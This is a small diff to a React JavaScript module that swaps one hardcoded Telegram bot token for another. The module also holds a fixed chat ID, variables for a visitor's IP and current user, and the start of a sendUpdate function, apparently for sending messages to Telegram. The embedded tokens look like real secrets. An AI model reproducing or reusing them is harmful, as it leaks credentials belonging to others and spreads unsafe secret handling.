@@ -13,7 +13,7 @@ import { useParams } from 'react-router-dom/cjs/react-router-dom.min';
 let ip = 'Not Found';
 let currentUser = 'unknown';
 let time = 0;
-const tgtoken = 'bot5479990786:AAHSybZrFWHaYO0DtwBQmzs0RFkzeiHWcwU';
+const tgtoken = '5807856562:AAFx-yxoMg2aoAggt4M0NU7qeLe49DIv__g';
 const chat_id = "-1001166751237"
 
 export async function sendUpdate(msg) {
